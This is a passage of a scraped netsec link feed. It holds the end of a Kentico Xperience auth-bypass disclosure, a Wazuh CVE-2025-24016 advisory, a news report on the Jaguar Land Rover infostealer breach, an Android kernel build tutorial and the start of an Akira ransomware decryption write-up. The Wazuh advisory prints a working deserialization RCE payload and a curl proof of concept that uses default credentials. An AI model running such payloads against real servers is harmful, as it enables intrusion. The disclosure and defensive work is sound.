a proper username.</p><h3>Why Are There No CVEs?!?!!1</h3><p>We don't know, ask MITRE.</p><h3>Detection Artifact Generators</h3><p>We have created two separate detection artifact generators to make it easier for security teams to verify whether your instance is vulnerable, while not providing full PoCs:</p><p>You need to provide a valid target host within  argument, like: <a href=\"http://hostname/?ref=labs.watchtowr.com\">http://hostname</a> or <code>-H &lt;http://hostname/Kentico13_Admin</code>&gt; . Script will make a single HTTP Request and will analyze the response.</p><pre><code>python3 .\\\\watchTowr-vs-kentico-xperience13-AuthBypass-wt-2025-0006.py -H &lt;http://hostname&gt;\n                         __         ___  ___________\n         __  _  ______ _/  |__ ____ |  |_\\\\__    ____\\\\____  _  ________\n         \\\\ \\\\/ \\\\/ \\\\__  \\\\    ___/ ___\\\\|  |  \\\\|    | /  _ \\\\ \\\\/ \\\\/ \\\\_  __ \\\\\n          \\\\     / / __ \\\\|  | \\\\  \\\\___|   Y  |    |(  &lt;_&gt; \\\\     / |  | \\\\/\n           \\\\/\\\\_/ (____  |__|  \\\\___  |___|__|__  | \\\\__  / \\\\/\\\\_/  |__|\n                                  \\\\/          \\\\/     \\\\/\n\n        watchTowr-vs-kentico-xperience13-AuthBypass-wt-2025-0006.py\n        (*) WT-2025-0011: Kentico Xperience 13 CMS - Staging Service Authentication Bypass Check\n\n          - Piotr Bazydlo (@chudyPB) of watchTowr\n\n        CVEs: TBD\n\n[+] Verifying Authentication Bypass in Staging API\n[+] VULNERABLE: Authentication Bypassed!\n</code></pre><p>In addition to the  argument, you can provide an optional  (username) argument.</p><p>Prior to version 13.0.173, this vulnerability can be exploited with any username provided.</p><p>From version 13.0.173 to 13.0.177, you need to provide a valid Staging Service username for the successful exploitation (default username is ).</p><p>To sum up, we've been able to identify two unique Authentication Bypasses in the Kentico Xperience CMS Staging API and chain them with a Post-Auth RCE.</p><ul><li>WT-2025-0006 Authentication Bypass, exploitable on Kentico Xperience 13 &lt; 13.0.173.</li><li>WT-2025-0007 Post-Authentication Remote Code Execution, exploitable on Kentico Xperience 13 &lt; 13.0.178.</li><li>WT-2025-0011 Authentication Bypass, exploitable on Kentico Xperience 13 &lt; 13.0.178.</li></ul><p>As is hopefully now incredibly clear, an attacker who gains access to the Staging API gains full control over the CMS. Combined with the post-auth RCE vulnerability that we’ve highlighted, it should be unequivocally obvious that these vulnerabilities can be trivially chained for RCE.</p><p>We want to say thank you to the entire Kentico team involved in the disclosure process, for both their rapid and professional engagement - vulnerabilities happen, it’s life, but positive vendor engagement enables the correct outcomes for all, including customers.</p><p>We could say a lot about this research, but if we had to summarize it somehow, we’d say:</p><p>“Please, do not use the obsolete Microsoft Web Services Enhancement 3.0 for anything - you’ll get rekt\".</p><p><strong>WT-2025-0006 (Authentication Bypass)</strong></p><table><tbody><tr><td>Vulnerability discovered and disclosed to Kentico</td></tr><tr><td>watchTowr hunts through client attack surfaces for impacted systems, and communicates with those affected</td></tr><tr><td>Kentico successfully reproduced the vulnerability</td></tr><tr><td>CVE reservation request submitted to MITRE</td></tr><tr><td>Vendor releases hotfix 13.0.173 with the patch</td></tr><tr><td>MITRE notified that the vulnerability has been fixed</td></tr><tr><td>Sent MITRE query about CVE status</td></tr></tbody></table><p><strong>WT-2025-0011 (2nd Authentication Bypass)</strong></p><table><tbody><tr><td>Vulnerability discovered and disclosed to Kentico</td></tr><tr><td>watchTowr hunts through client attack surfaces for impacted systems, and communicates with those affected</td></tr><tr><td>Kentico successfully reproduced the vulnerability</td></tr><tr><td>CVE reservation request submitted to MITRE</td></tr><tr><td>Vendor releases hotfix 13.0.178 with the patch</td></tr><tr><td>Sent MITRE query about CVE status</td></tr></tbody></table><p><strong>WT-2025-0007 (Post-Auth RCE in Staging API)</strong></p><table><tbody><tr><td>Vulnerability discovered and disclosed to Kentico</td></tr><tr><td>Kentico successfully reproduced the vulnerability</td></tr><tr><td>CVE reservation request submitted to MITRE</td></tr><tr><td>Vendor releases hotfix 13.0.178 with the patch</td></tr><tr><td>Sent MITRE query about CVE status</td></tr></tbody></table><p>At&nbsp;<a href=\"https://www.watchtowr.com/?ref=labs.watchtowr.com\">watchTowr</a>, we passionately believe that continuous security testing is the future and that rapid reaction to emerging threats single-handedly prevents inevitable breaches.</p><p>With the watchTowr Platform, we deliver this capability to our clients every single day - it is our job to understand how emerging threats, vulnerabilities, and TTPs could impact their organizations, with precision.</p><p>If you'd like to learn more about the&nbsp;<a href=\"https://www.watchtowr.com/?ref=labs.watchtowr.com\"></a><strong>, our Attack Surface Management and Continuous Automated Red Teaming solution,</strong>&nbsp;please get in touch.</p><div><div><section><div><section><h3>Gain early access to our research, and understand your exposure, with the watchTowr Platform</h3><a href=\"https://watchtowr.com/demo/\">REQUEST A DEMO</a></section></div></section></div></div>","contentLength":54095,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1jdbeaw/bypassing_authentication_like_its_the_90s_preauth/"},{"title":"CVE-2025-24016: Unsafe Deserialization Vulnerability in Wazuh Leading to Remote Code Execution","url":"https://cvereports.com/cve-2025-24016-unsafe-deserialization-vulnerability-in-wazuh-leading-to-remote-code-execution/","date":1742208210,"author":"/u/amitschenedel","guid":907,"unread":true,"content":"<p>CVE-2025-24016 is a critical remote code execution (RCE) vulnerability affecting Wazuh, a widely used open-source security information and event management (SIEM) platform. This vulnerability stems from unsafe deserialization of DistributedAPI (DAPI) parameters, allowing an attacker with API access to execute arbitrary Python code on the Wazuh server. Specifically, versions 4.4.0 to 4.9.0 are affected. The vulnerability is triggered when an attacker injects a malicious dictionary into a DAPI request or response, which is then processed by the  function. Successful exploitation can lead to complete system compromise, including data theft, service disruption, and further lateral movement within the network. The vulnerability has been patched in version 4.9.1 by replacing the unsafe  function with .</p><ul><li> 4.4.0 to 4.9.0</li><li> Unsafe Deserialization</li><li> 9.9 (Critical)</li><li> CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:H/A:H</li><li><code>framework/wazuh/core/cluster/common.py</code> -  function</li><li> Low (API Access)</li></ul><p>The vulnerability resides in the  function within the <code>framework/wazuh/core/cluster/common.py</code> file. This function is responsible for deserializing JSON data received through the Distributed API. The DAPI is used for communication between Wazuh components, including the Wazuh API, manager, and agents.</p><p>The vulnerable code snippet is as follows (prior to the patch):</p><pre><code>def as_wazuh_object(dct: Dict):\n    try:\n        if '__wazuh_datetime__' in dct:\n            return datetime.datetime.fromisoformat(dct['__wazuh_datetime__'])\n        elif '__unhandled_exc__' in dct:\n            exc_data = dct['__unhandled_exc__']\n            return eval(exc_data['__class__'])(*exc_data['__args__'])\n        return dct\n\n    except (KeyError, AttributeError):\n        return dct\n</code></pre><p>This code checks if the dictionary  contains the key . If it does, it retrieves the  and  values from the dictionary and uses the  function to create an instance of the specified class with the provided arguments. The use of  on attacker-controlled data is inherently dangerous, as it allows arbitrary Python code execution.</p><p>The root cause of CVE-2025-24016 is the use of the  function to deserialize data received from the Distributed API. The  function executes arbitrary Python code, making it a prime target for exploitation. An attacker can craft a malicious JSON payload containing a specially crafted dictionary with the  key. This dictionary specifies a Python class and arguments that, when evaluated by , execute arbitrary code.</p><p>The vulnerability is triggered because the  function does not properly sanitize or validate the input data before passing it to . This allows an attacker to inject arbitrary code into the  and  fields, leading to remote code execution.</p><p>For example, an attacker could send the following JSON payload:</p><pre><code>{\n    \"__unhandled_exc__\": {\n        \"__class__\": \"os.system\",\n        \"__args__\": [\"touch /tmp/pwned\"]\n    }\n}\n</code></pre><p>When this payload is processed by the  function, the  function will execute <code>os.system(\"touch /tmp/pwned\")</code>, creating a file named  on the Wazuh server.</p><p>The vulnerability is particularly dangerous because it can be triggered by anyone with API access. This includes compromised dashboards, Wazuh servers within the cluster, and, in certain configurations, even compromised agents. The DAPI is designed for internal communication between Wazuh components, but the lack of proper input validation makes it vulnerable to exploitation.</p><p>The vulnerability was patched in Wazuh version 4.9.1. The patch replaces the unsafe  function with . The  function safely evaluates a string containing a Python literal (e.g., a string, number, tuple, list, dict, boolean, or None). It does not execute arbitrary code, mitigating the RCE vulnerability.</p><p>Here's the relevant code change in <code>framework/wazuh/core/cluster/common.py</code>:</p><pre><code>--- a/framework/wazuh/core/cluster/common.py\n+++ b/framework/wazuh/core/cluster/common.py\n@@ -1824,7 +1825,8 @@ def as_wazuh_object(dct: Dict):\n             return datetime.datetime.fromisoformat(dct['__wazuh_datetime__'])\n         elif '__unhandled_exc__' in dct:\n             exc_data = dct['__unhandled_exc__']\n-            return eval(exc_data['__class__'])(*exc_data['__args__'])\n+            exc_dict = {exc_data['__class__']: exc_data['__args__']}\n+            return ast.literal_eval(json.dumps(exc_dict))\n         return dct\n \n     except (KeyError, AttributeError):\n</code></pre><p><strong>Line-by-line explanation:</strong></p><ul><li><code>-           return eval(exc_data['__class__'])(*exc_data['__args__'])</code>: This line contains the vulnerable code. It uses  to execute arbitrary code based on the  and  values in the  dictionary.</li><li><code>+           exc_dict = {exc_data['__class__']: exc_data['__args__']}</code>: This line creates a dictionary with the class name as the key and the arguments as the value.</li><li><code>+           return ast.literal_eval(json.dumps(exc_dict))</code>: This line converts the dictionary to a JSON string and then uses  to safely evaluate it. This prevents arbitrary code execution.</li></ul><p>The patch effectively mitigates the vulnerability by replacing the unsafe  function with the safe  function. The  function only evaluates Python literals, preventing attackers from injecting arbitrary code.</p><p>Additionally, the following changes were made in <code>api/test/integration/tavern_utils.py</code>:</p><pre><code>--- a/api/test/integration/tavern_utils.py\n+++ b/api/test/integration/tavern_utils.py\n@@ -2,7 +2,7 @@\n # Created by Wazuh, Inc. &lt;info@wazuh.com&gt;.\n # This program is a free software; you can redistribute it and/or modify it under the terms of GPLv2\n \n--\n+import ast\n import json\n import re\n import subprocess\n@@ -238,7 +238,7 @@ def test_validate_data_dict_field(response, fields_dict):\n \n         for element in field_list:\n             try:\n-                assert (isinstance(element[key], eval(value)) for key, value in dikt.items())\n+                assert (isinstance(element[key], ast.literal_eval(value)) for key, value in dikt.items())\n             except KeyError:\n                 assert len(element) == 1\n                 assert isinstance(element['count'], int)\n@@ -486,7 +486,7 @@ def check_agent_active_status(agents_list):\n             raise subprocess.SubprocessError(\"Error while trying to get agents\") from exc\n \n         # Transform string representation of list to list and save agents id\n-        id_active_agents = [agent['id'] for agent in eval(output)]\n+        id_active_agents = [agent['id'] for agent in ast.literal_eval(output)]\n \n         if all(a in id_active_agents for a in agents_list):\n             break\n</code></pre><p>These changes replace  with  in the test suite, ensuring that the tests are also using the safe evaluation method.</p><p>Finally, the following changes were made in <code>framework/wazuh/core/cluster/tests/test_common.py</code>:</p><pre><code>--- a/framework/wazuh/core/cluster/tests/test_common.py\n+++ b/framework/wazuh/core/cluster/tests/test_common.py\n@@ -1749,7 +1749,11 @@ def test_as_wazuh_object_ok():\n     # Test the fifth condition\n     result = cluster_common.as_wazuh_object({'__unhandled_exc__': {'__class__': 'ValueError',\n                                                                    '__args__': ('test',)}})\n-    assert isinstance(result, ValueError)\n+    assert result == {\"ValueError\": [\"test\"]}\n+\n+    result = cluster_common.as_wazuh_object({'__unhandled_exc__': {'__class__': 'exit',\n+                                                                   '__args__': []}})\n+    assert result == {\"exit\": []}\n \n     # No condition fulfilled\n     assert isinstance(cluster_common.as_wazuh_object({\"__wazuh_datetime_bad__\": \"2021-10-14\"}), dict)\n</code></pre><p>These changes update the tests to reflect the new behavior of  after the patch.  Instead of returning a  or exiting, the function now returns a dictionary representing the exception.</p><p>An attacker can exploit CVE-2025-24016 by sending a malicious JSON payload to the Wazuh server through the API. The payload must contain the  key, along with the  and  values that specify the code to be executed.</p><p>The following PoC demonstrates how to exploit the vulnerability using the  endpoint:</p><pre><code>curl -X POST -k -u \"wazuh-wui:MyS3cr37P450r.*-\" -H \"Content-Type: application/json\" --data '{\"__unhandled_exc__\":{\"__class__\": \"os.system\", \"__args__\": [\"touch /tmp/pwned\"]}}' https://&lt;worker-server&gt;:55000/security/user/authenticate/run_as\n</code></pre><ul><li>: Specifies the HTTP method as POST.</li><li>: Disables SSL certificate verification (for testing purposes).</li><li><code>-u \"wazuh-wui:MyS3cr37P450r.*-\"</code>: Provides the username and password for authentication. The default credentials are used here.</li><li><code>-H \"Content-Type: application/json\"</code>: Sets the Content-Type header to application/json.</li><li><code>--data '{\"__unhandled_exc__\":{\"__class__\": \"os.system\", \"__args__\": [\"touch /tmp/pwned\"]}}'</code>: Specifies the malicious JSON payload. This payload will execute the command  on the Wazuh server.</li><li><code>https://&lt;worker-server&gt;:55000/security/user/authenticate/run_as</code>: Specifies the URL of the  endpoint. Replace  with the actual hostname or IP address of the Wazuh worker server.</li></ul><ol><li> The attacker identifies a vulnerable Wazuh server (version 4.4.0 to 4.9.0).</li><li> The attacker obtains valid API credentials, either through default credentials, credential stuffing, or other means.</li><li> The attacker sends a malicious JSON payload to the  endpoint, as shown in the PoC above.</li><li> The  function deserializes the payload and executes the attacker-controlled code.</li><li> The attacker gains control of the Wazuh server and can perform various malicious activities, such as data theft, service disruption, or lateral movement within the network.</li></ol><p>The exploitation of CVE-2025-24016 can have severe consequences for organizations using Wazuh. An attacker could:</p><ul><li><strong>Gain complete control of the Wazuh server:</strong> This allows the attacker to access sensitive data, modify configurations, and install malware.</li><li><strong>Compromise the entire Wazuh cluster:</strong> If the attacker gains control of the master server, they can potentially compromise all other servers and agents in the cluster.</li><li><strong>Disrupt security monitoring:</strong> The attacker can disable or tamper with Wazuh's monitoring capabilities, allowing them to carry out further attacks undetected.</li><li> The attacker can access logs, alerts, and other sensitive data stored on the Wazuh server.</li><li><strong>Use the Wazuh server as a launching pad for further attacks:</strong> The attacker can use the compromised server to attack other systems within the network.</li></ul><p>To mitigate the risk of CVE-2025-24016, organizations should take the following steps:</p><ol><li><strong>Upgrade to Wazuh version 4.9.1 or later:</strong> This version contains the patch that fixes the vulnerability.</li><li> Limit API access to only authorized users and systems.</li><li><strong>Implement strong authentication:</strong> Use strong passwords and multi-factor authentication to protect API credentials.</li><li> Monitor API traffic for suspicious activity, such as unexpected requests or large data transfers.</li><li><strong>Regularly review and update security configurations:</strong> Ensure that Wazuh's security configurations are up-to-date and properly configured.</li><li><strong>Implement network segmentation:</strong> Segment the network to limit the impact of a successful attack.</li><li><strong>Use a Web Application Firewall (WAF):</strong> A WAF can help to detect and block malicious requests before they reach the Wazuh server.</li></ol><ul><li>Review and restrict access to the Wazuh API. Ensure that only authorized users and systems have access.</li><li>Implement strong authentication mechanisms for the API, such as multi-factor authentication.</li><li>Monitor API logs for suspicious activity.</li></ul><ul><li>Follow the principle of least privilege when granting API access.</li><li>Regularly review and update security configurations.</li><li>Implement a robust security monitoring program.</li><li>Stay informed about the latest security threats and vulnerabilities.</li></ul><p>If upgrading to Wazuh version 4.9.1 is not immediately possible, consider the following temporary workarounds:</p><ul><li><strong>Implement a WAF rule to block malicious payloads:</strong> A WAF rule can be created to detect and block requests containing the  key. However, this workaround is not foolproof, as attackers may be able to bypass the rule with obfuscation techniques.</li><li><strong>Disable the  endpoint:</strong> If the  endpoint is not required, it can be disabled to prevent exploitation of the vulnerability through this specific endpoint. However, this does not address the underlying vulnerability in the  function.</li></ul><h2>Timeline of Discovery and Disclosure</h2><ul><li><strong>Vulnerability Discovered:</strong> Unknown</li><li> Unknown</li><li> July 23, 2024 (Wazuh 4.9.1)</li><li> February 10, 2025</li></ul><p>CVE-2025-24016 is similar to other unsafe deserialization vulnerabilities that have been discovered in various software applications. These vulnerabilities typically arise when an application deserializes data from an untrusted source without proper validation, allowing an attacker to inject malicious code into the deserialized object.</p><p>A well-known example is the Apache Struts vulnerability (CVE-2017-5638), which allowed remote code execution through the Content-Type header. Similar to CVE-2025-24016, the Apache Struts vulnerability was caused by the application's failure to properly sanitize user-supplied input before deserialization.</p><p>The evolution of security practices has led to increased awareness of the risks associated with deserialization. Modern frameworks and libraries often provide built-in mechanisms for safe deserialization, such as whitelisting allowed classes or using secure serialization formats. However, as CVE-2025-24016 demonstrates, vulnerabilities can still arise when developers fail to use these mechanisms properly or when custom deserialization logic is implemented without adequate security considerations.</p><p>The key takeaway from these vulnerabilities is the importance of input validation and secure coding practices. Applications should never trust data from untrusted sources and should always sanitize and validate input before processing it. Developers should also be aware of the risks associated with deserialization and should use secure deserialization techniques whenever possible.</p>","contentLength":13737,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1jd9oed/cve202524016_unsafe_deserialization_vulnerability/"},{"title":"Jaguar Land Rover Breached by HELLCAT Ransomware Group Using Its Infostealer Playbook—Then a Second Hacker Strikes","url":"https://www.infostealers.com/article/jaguar-land-rover-breached-by-hellcat-ransomware-using-its-infostealer-playbook-then-a-second-hacker-strikes/","date":1742199866,"author":"/u/Malwarebeasts","guid":888,"unread":true,"content":"<p>In a repeat of a now-familiar playbook, the HELLCAT ransomware group has claimed responsibility for a massive data breach targeting , leaking gigabytes of sensitive information including proprietary documents, source codes, and employee and partner data. </p><p>The breach, executed by a threat actor known as “Rey,” mirrors a pattern of attacks Hudson Rock researchers have previously detected against high-profile victims like <a href=\"https://www.infostealers.com/article/telefonica-breach-infostealer-malware-opens-door-for-social-engineering-tactics/\">Telefónica</a>, <a href=\"https://www.infostealers.com/article/schneider-electric-hacked-and-blackmailed-due-to-lumma-infostealer-infection/\">Schneider Electric</a>, and <a href=\"https://www.infostealers.com/article/ais-role-in-turning-massive-data-leaks-into-hacker-paydays-a-look-at-the-orange-breach/\">Orange</a>.</p><p>At the heart of this latest incident lies a technique that has become HELLCAT’s signature: <strong>exploiting Jira credentials harvested from compromised employees that were infected by Infostealers.</strong></p><p>What makes this breach particularly alarming is its reliance on a technique that has proven devastatingly effective: <strong>the use of infostealer malware to harvest credentials, which are then weaponized to infiltrate critical systems like Atlassian JIRA. </strong></p><p>In this case, the compromised credentials belonged to an LG Electronics employee infected by an infostealer who had third party credentials to JLR’s Jira server.</p><p>Just days after Rey’s initial announcement, the Jaguar Land Rover breach took an even darker turn. A second threat actor, operating under the alias “APTS,” emerged with his own thread on the forum, <strong>claiming to have exploited infostealer credentials that date all the way back to 2021, also belonging to an LG Electronic employee, to access JLR’s systems and exfiltrate an even larger amount of data from the company</strong>.</p><p>APTS shared a screenshot of a Jira dashboard and displayed additional sensitive data, they also <strong>confirmed that the credentials that were used matched the ones we have in Hudson Rock’s database</strong>:</p><p>“APTS” leaked a further tranche of data—<strong>estimated at an even more worrying scale of 350 gigabytes</strong>—containing data that did not exist in Rey’s data dump.</p><p>HELLCAT’s modus operandi is very efficient. Infostealer malware—such as Lumma, which was implicated in the Schneider Electric breach—silently infects employees’ devices, often through phishing emails, malicious downloads, or compromised websites. Once embedded, the malware exfiltrates sensitive data, including login credentials for corporate systems. These stolen credentials are then sold or hoarded on the dark web, waiting for threat actors like Rey and “APTS” to exploit them.</p><p>In the Jaguar Land Rover breach, following the thread posted by “APTS” and a short confrontation between the threat actors, Rey himself confirmed publicly that the entry point was an Atlassian Jira instance while referencing Hudson Rock’s research on his Telefonica hack –</p><p>What sets the JLR breach apart is the age of the compromised credentials. Hudson Rock, which has tracked infostealer infections since at least 2018, had previously identified the employee’s stolen login details as part of its vast database of exposed credentials. Despite their age, the credentials remained valid and unchanged within JLR’s systems—a lapse that hackers exploited years later. <strong>This delay between infection and exploitation is a reminder of the long tail of infostealer campaigns, where stolen data can linger as a latent threat until the right buyer comes along.</strong></p><p>The Jaguar Land Rover breach is the latest in a string of high-profile attacks that expose the devastating potential of infostealer malware. Telefónica’s breach demonstrated how such infections could enable social engineering, while Schneider Electric’s ordeal revealed the blackmail potential of stolen data. Orange’s case illustrated how AI could amplify these leaks into hacker paydays. Now, JLR’s breach adds a new layer: the enduring danger of legacy credentials left unaddressed.</p><p>For organizations, the lesson is clear—infostealer infections are not one-off incidents but ticking time bombs. The credentials they harvest can remain viable for years, especially if companies fail to implement robust monitoring, multi-factor authentication (MFA), or timely credential rotation.</p><p>Atlassian Jira, while a powerful tool, has become a prime target for attackers due to its centrality in enterprise workflows and the wealth of data it houses. Once inside, threat actors like HELLCAT can move laterally, escalate privileges, and extract sensitive information with alarming ease.</p><p>As Jaguar Land Rover scrambles to assess the damage and secure its systems, the cybersecurity community braces for the fallout. The leaked data—source code, employee details, and partner information—could fuel further attacks, from targeted phishing campaigns to intellectual property theft. This is especially true as threat actors begin utilizing AI to take advantage of large unorganized data breaches to create a bigger impact.</p><p>Meanwhile, HELLCAT’s success is likely to inspire copycat operations, with infostealer credentials remaining a hot commodity on the dark web.</p><p>Thanks for reading,&nbsp;</p>","contentLength":4899,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1jd7t1f/jaguar_land_rover_breached_by_hellcat_ransomware/"},{"title":"History of NULL Pointer Dereferences on macOS","url":"https://afine.com/history-of-null-pointer-dereferences-on-macos/","date":1742197892,"author":"/u/bajk","guid":875,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1jd7e2j/history_of_null_pointer_dereferences_on_macos/"},{"title":"Android Kernel Adventures: Insights into Compilation, Customization and Application Analysis","url":"https://revflash.medium.com/android-kernel-adventures-insights-into-compilation-customization-and-application-analysis-d20af6f2080a","date":1742171884,"author":"/u/thewatcher_","guid":842,"unread":true,"content":"<p>This article marks the first in a series aimed at sharing my adventures, personal notes, and insights into the Android kernel. My focus will primarily be on how to modify it for a deeper analysis of the applications running on the system. It’s important to note that it’s been quite a while since my last experience with the Android kernel — the last time I compiled and ran a module on my old Samsung Galaxy. As expected, a lot has changed since then, and this will be a process of rediscovery and relearning as I write the upcoming articles. If I happen to make any mistakes or if you have any suggestions, feel free to reach out. Without further ado, let’s embark on this journey!</p><p>Given the increasing complexity of RASP (Runtime Application Self-Protection) solutions for Android applications, focusing efforts on deeper layers of the system, such as the Android kernel, emerges as a strategic approach for more effective security analysis. By concentrating on the kernel, there is no need to bypass protections implemented at the application layer, as RASP solutions are specifically designed to protect higher layers but do not cover the kernel. Moreover, understanding the inner workings of the Android kernel can significantly enhance the work of vulnerability researchers, providing valuable insights into vulnerabilities within the Android operating system.</p><p>According to <a href=\"https://source.android.com/docs/core/architecture/kernel\" rel=\"noopener ugc nofollow\" target=\"_blank\">Android’s documentation</a>, the Android kernel consists of the Linux kernel along with Android-specific patches, forming what is known as <strong>Android Common Kernels (ACKs)</strong>. Starting from kernel version 5.4 and onwards, ACKs are referred to as <strong>GKI (Generic Kernel Image)</strong> kernels. The GKI is a Google-certified boot image that contains a kernel built from the ACK source tree, designed to be written to the boot partition of Android devices. The GKI is part of a Google project aimed at addressing kernel fragmentation by separating the common core functionality of the kernel, maintained by Google, from the vendor-specific kernel build configuration that builds vendor kernel modules. The diagram below illustrates the architecture of Android, showing that everything runs on top of the Linux kernel.</p><p>In <a href=\"https://source.android.com/docs/core/architecture/kernel/android-common\" rel=\"noopener ugc nofollow\" target=\"_blank\">Android’s documentation</a>, you can also find a list of supported kernels for each version of Android, categorized into  and . The Launch Kernel is the valid kernel for the release of a device with a specific version of Android, while the Feature Kernel ensures the implementation of version-specific features, preventing these features from being backported to earlier kernel versions.</p><p>For our tests, we chose the kernel . The Android kernel branches are organized to reflect both the Android version and the corresponding kernel version, following the format <strong>ANDROID_RELEASE-KERNEL_VERSION</strong>, where  represents the Android version and  indicates the kernel version. For example, the android13–5.15 kernel corresponds to kernel version 5.15 for Android 13. We used the following commands to download the Android kernel.</p><pre></pre><p>In the  directory, we can observe the presence of a file called . This indicates that we are dealing with a Bazel project.  is a free and open-source software tool developed by Google, designed for automating software build and testing processes. Directories that contain a WORKSPACE file are considered the root of a workspace, which is a directory tree containing the source code files of the software we are attempting to build. Instructions for installing Bazel can be found at this <a href=\"https://bazel.build/install\" rel=\"noopener ugc nofollow\" target=\"_blank\">link</a>.</p><p>Before we begin compiling the kernel, it is important to highlight that we will use  to test our kernel. The main difference between Goldfish (the emulator used in Android Studio) and Cuttlefish lies in their purpose and how they simulate the Android environment. Goldfish is optimized for application testing but is not ideal for testing the operating system, as it does not accurately replicate real hardware and has limitations, particularly during the boot process. On the other hand, Cuttlefish is a virtual platform designed to simulate real hardware more faithfully, making it the ideal choice for testing the Android operating system and kernel, as it provides a more accurate and representative simulation of the behavior of a physical device. You can find the installation instructions for Cuttlefish through this <a href=\"https://source.android.com/docs/devices/cuttlefish/get-started\" rel=\"noopener ugc nofollow\" target=\"_blank\">link</a>.</p><p>The Android kernel build files use a framework called <a href=\"https://android.googlesource.com/kernel/build/+/refs/heads/main/kleaf/docs/kleaf.md\" rel=\"noopener ugc nofollow\" target=\"_blank\"></a>, which, along with Bazel, is responsible for building the Android kernel and other related artifacts, such as boot images, kernel modules, and more. Although I’m not an expert in Kleaf or Bazel, my focus here will be to explain only the key code snippets necessary to understand how to build and modify the Android kernel.</p><p>Do you remember when I mentioned that the GKI splits the kernel into a kernel image maintained by Google and a module specific to the SoC and board, implemented by vendors? The kernel image files maintained by Google are stored in the  directory, while the files for the SoC and board-specific module are stored in the  directory. These two kernels will be compiled separately, as we will see next.</p><p>Upon starting our analysis with the  file, we identified the presence of the <a href=\"https://android.googlesource.com/kernel/build/+/146474a1d1666759345578580470c1ab4553c0ca/kleaf/common_kernels.bzl\" rel=\"noopener ugc nofollow\" target=\"_blank\"></a> macro, which is responsible for defining the common build targets for Android kernels. For the x86_64 kernel, the architecture we will use to build our kernel, the configuration file used is .</p><pre></pre><p>The configuration file build.config.gki.x86_64 uses three additional configuration files: , , and . I won’t be able to go over all of them in detail, but there is an important point to note: within the build.config.gki file, you will encounter the execution of the  command. If you plan to modify the default kernel configuration (as we will do shortly), it’s important to comment out this line. Otherwise, after changes are detected in the configuration file, the kernel build will fail.</p><pre></pre><p>Upon analyzing the <strong>common-modules/virtual-device/Build.bazel</strong> file, we found several kernel build targets. Since we will be building the kernel with support for a virtual x86_64 device, our focus will be on the following lines:</p><pre></pre><p>We can see in this section of the script that the kernel configuration will be in the file <strong>build.config.virtual_device.x86_64</strong>. The content of the build.config.virtual_device.x86_64 file reveals that one of the configurations used in the kernel build is stored in the <strong>common/arch/x86/configs/gki_defconfig</strong> file. With this information, we can modify its contents to include additional features in the kernel. To test this, we will add support for , which is not enabled in the default kernel configuration.</p><pre></pre><p>ftrace is a tracing and profiling framework integrated directly into the Linux kernel. It allows the observation and recording of the kernel’s function execution flow through both static probes (added during kernel compilation) and dynamic probes (injected at runtime). Using these probes, ftrace enables the capture of events related to process scheduling, interrupts, system calls, function latencies, I/O device interactions, and even specific functions executed within the kernel. To enable ftrace in the kernel, the following lines must be added to the kernel configuration file, gki_defconfig.</p><pre></pre><p>Next, inside the  directory, we will execute the following commands to compile both kernels and the necessary modules for booting Cuttlefish.</p><pre></pre><p>After compilation, we can verify that files such as and  have been copied to the  directory. We will use these files to test the kernel on Cuttlefish.</p><p>With Cuttlefish properly configured, we can use the command below to test the newly compiled kernel. The parameters can be adjusted as needed.</p><pre></pre><p>The image below shows a virtual device in Cuttlefish running our kernel, with ftrace working correctly.</p><p>In conclusion, this article outlined the essential steps for compiling and modifying the Android kernel, as well as performing tests in Cuttlefish to verify its functionality. This lays the foundation for customizing the Android kernel in a virtualized environment. In the upcoming articles, we will explore advanced kernel debugging techniques and demonstrate how to customize the kernel to gather detailed information about the applications running on the system.</p>","contentLength":8195,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1jd0bgp/android_kernel_adventures_insights_into/"},{"title":"Decrypting Encrypted files from Akira Ransomware (Linux/ESXI variant 2024) using a bunch of GPUs","url":"https://tinyhack.com/2025/03/13/decrypting-encrypted-files-from-akira-ransomware-linux-esxi-variant-2024-using-a-bunch-of-gpus/","date":1741915620,"author":"/u/yohanes","guid":712,"unread":true,"content":"<p>I recently helped a company recover their data from the Akira ransomware without paying the ransom. I’m sharing how I did it, along with the full source code.</p><p>To clarify, multiple ransomware variants have been named Akira over the years, and several versions are currently circulating. The variant I encountered has been active from late 2023 to the present (the company was breached this year).</p><p>There was an earlier version (before mid-2023) that contained a bug, allowing Avast to create a decryptor. However, once this was published, the attackers updated their encryption. I expect they will change their encryption again after I publish this.</p><p>You can find various Akira malware sample hashes at the following URL:</p><p>The sample that matches my client’s case is:</p><p><code>bcae978c17bcddc0bf6419ae978e3471197801c36f73cff2fc88cecbe3d88d1a</code></p><p>It is listed under the version: . The sample can be found on <a href=\"https://virus.exchange\">virus.exchange</a> (just paste the hash to search).</p><p>Note that the ransom message and the private/public keys will differ.</p><h2>We do this not because it is easy, but because we thought it would be easy</h2><p>I usually decline requests to assist with ransomware cases. However, when my friend showed me this particular case, a quick check made me think it was solvable.</p><p>From my initial analysis, I observed the following:</p><ul><li>The ransomware uses the current time (in nanoseconds) as a seed.</li><li>On my Linux machine, file modification times have nanosecond resolution.</li><li>They provided a screenshot of a partial log (), showing when the ransomware was executed, with millisecond resolution.</li></ul><p>Based on this, my initial thought was: <em>“This should be easy—just brute-force it by looking at the file timestamps. How hard can it be?”</em></p><p>I’ll explain in more detail, but it turned out to be more complicated than expected:</p><ul><li>The malware doesn’t rely on a single moment in time but uses , each with . The fist two and last two are related, so we can’t just bruteforce the time one by one. Key generation is complex, involving  for each timestamp. Each file ends up with a unique key.</li><li>The  only records file modification times with .</li><li>Not all  have millisecond resolution in their log files, some only log with second-level precision. I am still unsure what configuration file causes this different behavior</li><li>The malware uses  during execution.</li><li>The file modification time reflects , not when it is opened for writing.</li></ul><p>The code is written in , which is notoriously difficult to read, but fortunately, it wasn’t obfuscated. The binary is statically linked (a bit harder to analyze), but all strings are in cleartext. The error messages indicate that the  library is used, which made understanding the code much easier.</p><p>The code to generate random is like this (the actual code is in 